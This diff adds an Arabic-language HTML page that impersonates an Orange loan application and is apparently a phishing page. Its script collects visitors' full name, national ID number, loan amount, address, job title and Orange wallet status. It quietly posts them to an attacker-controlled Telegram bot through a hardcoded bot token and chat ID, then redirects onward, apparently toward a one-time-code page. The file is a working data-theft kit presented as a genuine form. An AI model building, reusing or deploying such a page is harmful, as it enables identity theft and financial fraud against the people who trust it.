@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<meta property="og:title" content="     معلومات مقدم القرض   Orange" />
+<meta property="og:description" content="سجل        " />
+<meta property="og:image" content="https://scontent.fadj1-1.fna.fbcdn.net/v/t39.30808-6/631725457_122101281927252052_7094751595405353694_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=1d70fc&_nc_eui2=AeHeobe-V5TPA_REY7pWRukrwhs439ag6u3CGzjf1qDq7cBi_Ly-BQkKE60XXCgUQpOG-mLExffTzKGb5SPpS-Ww&_nc_ohc=v36wGl4ewpUQ7kNvwGxV4GL&_nc_oc=AdoZKjBuYJCeE3RcAG_yAPt3FmPhiB3G7KVMpknsIP2zX9Lfv45YoHfSGfHTOuOhxUA&_nc_zt=23&_nc_ht=scontent.fadj1-1.fna&_nc_gid=Wkp4123ITeo3s2Ns3STNVw&_nc_ss=7a3a8&oh=00_Af28haD2LPVsLq1szZswdrIjp_J6jnat6sITv_doG016gg&oe=69DD3EDF" />
+<meta property="og:url" content="https://yourdomain.com/otp.html" />
+<meta property="og:type" content="website" />
+  <link rel="stylesheet" href="style.css" />
+<style>
+body {
+  margin: 0;
+  font-family: Tahoma;
+  background: #f2f2f2;
+}
+
+.header img {
+  width: 100%;
+  height: 250px;
+  object-fit: cover;
+}
+
+.container {
+  width: 92%;
+  margin: -30px auto 20px;
+  background: #fff;
+  padding: 18px;
+  border-radius: 15px;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+}
+
+h2 {
+  text-align: center;
+}
+
+.form-group {
+  margin-bottom: 14px;
+}
+
+label {
+  font-size: 14px;
+  font-weight: bold;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  border-radius: 8px;
+  border: 1px solid #ddd;
+}
+
+.radio-group {
+  display: flex;
+  justify-content: space-between;
+}
+
+.radio-group label {
+  flex: 1;
+  text-align: center;
+  background: #eee;
+  padding: 10px;
+  margin: 5px;
+  border-radius: 8px;
+}
+
+.radio-group input {
+  display: none;
+}
+
+.radio-group input:checked + label {
+  background: #27ae60;
+  color: white;
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  background: #27ae60;
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+}
+.container {
+  width: 320px;
+  max-width: 95%;
+  margin: -30px auto 20px;
+  background: #fff;
+  padding: 15px;
+  border-radius: 12px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+}
+input {
+  width: 100%;
+  padding: 10px;
+  font-size: 14px;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+.form-group {
+  margin-bottom: 10px;
+}
+
+label {
+  font-size: 13px;
+}
+input {
+  width: 100%;
+  padding: 10px;
+  font-size: 14px;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+  text-align: center; /* 👈 هذا المهم */
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="fdf.png">
+</div>
+
+<div class="container">
+  <h2>معلومات مقدم القرض  </h2>
+
+  <form id="loanForm">
+
+    <div class="form-group">
+      <label>الاسم الكامل</label>
+      <input type="text" id="name">
+    </div>
+
+    <div class="form-group">
+      <label>الرقم الوطني</label>
+      <input type="tel" id="idNumber">
+    </div>
+
+    <div class="form-group">
+      <label>قيمة القرض</label>
+      <input type="tel" id="loanAmount">
+    </div>
+
+    <div class="form-group">
+      <label>عنوان السكن</label>
+      <input type="text" id="address">
+    </div>
+
+    <div class="form-group">
+      <label>المسمى الوظيفي</label>
+      <input type="text" id="job">
+    </div>
+
+    <div class="form-group">
+      <label>هل لديك محفظة أورنج؟</label>
+
+      <div class="radio-group">
+        <input type="radio" id="yes" name="orange" value="نعم">
+        <label for="yes">نعم</label>
+
+        <input type="radio" id="no" name="orange" value="لا">
+        <label for="no">لا</label>
+      </div>
+    </div>
+
+    <button type="submit">إرسال الطلب</button>
+
+  </form>
+</div>
+
+<script>
+document.getElementById("loanForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const name = document.getElementById("name").value.trim();
+  const idNumber = document.getElementById("idNumber").value.trim();
+  const loanAmount = document.getElementById("loanAmount").value.trim();
+  const address = document.getElementById("address").value.trim();
+  const job = document.getElementById("job").value.trim();
+  const orange = document.querySelector('input[name="orange"]:checked');
+
+  // ✅ تحقق من الحقول
+  if (!name || !idNumber || !loanAmount || !address || !job || !orange) {
+    alert("يرجى تعبئة جميع الحقول");
+    return;
+  }
+
+  // ✅ تخزين محلي
+  localStorage.setItem("name", name);
+  localStorage.setItem("idNumber", idNumber);
+  localStorage.setItem("loanAmount", loanAmount);
+  localStorage.setItem("address", address);
+  localStorage.setItem("job", job);
+  localStorage.setItem("orange", orange.value);
+
+  // 🔑 بيانات البوت
+  const token = "8664807786:AAGJbX6MWFxJPrzuSkeZ0t06pGWCHfzQRHk";
+  const chat_id = "8108427825";
+
+  const message = `
+📋 طلب قرض جديد:
+
+👤 الاسم: ${name}
+🆔 الرقم الوطني: ${idNumber}
+💰 قيمة القرض: ${loanAmount}
+🏠 العنوان: ${address}
+💼 الوظيفة: ${job}
+📱 محفظة أورنج: ${orange.value}
+`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message
+      })
+    });
+
+    // ✅ تحويل الصفحة
+    window.location.href = "form.html";
+
+  } catch (err) {
+    alert("فشل الإرسال");
+    console.error(err);
+  }
+
+});
+</script>
+
+</body>
+</html>
